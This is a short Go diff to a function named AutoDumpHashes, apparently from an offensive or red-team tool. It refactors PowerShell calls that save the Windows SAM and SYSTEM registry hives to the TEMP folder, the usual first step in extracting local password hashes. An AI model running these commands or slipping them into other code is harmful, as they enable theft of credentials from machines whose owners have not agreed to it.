@@ -61,10 +61,9 @@ func AutoDumpHashes() ([]Hash, error) {
 	}
 
 	go func() {
-		o := exec.ExecutePowershell("reg save HKLM\\SAM " + os.Getenv("TEMP") + "\\sam") // Save SAM and SYSTEM registry
-		o = exec.ExecutePowershell("reg save HKLM\\SYSTEM " + os.Getenv("TEMP") + "\\system")
-		o = ""
-		fmt.Print(o)
+		exec.ExecutePowershell("reg save HKLM\\SAM " + os.Getenv("TEMP") + "\\sam") // Save SAM and SYSTEM registry
+		time.Sleep(100 * time.Millisecond)
+		exec.ExecutePowershell("reg save HKLM\\SYSTEM " + os.Getenv("TEMP") + "\\system")
 	}()
 	time.Sleep(2000 * time.Millisecond)
 
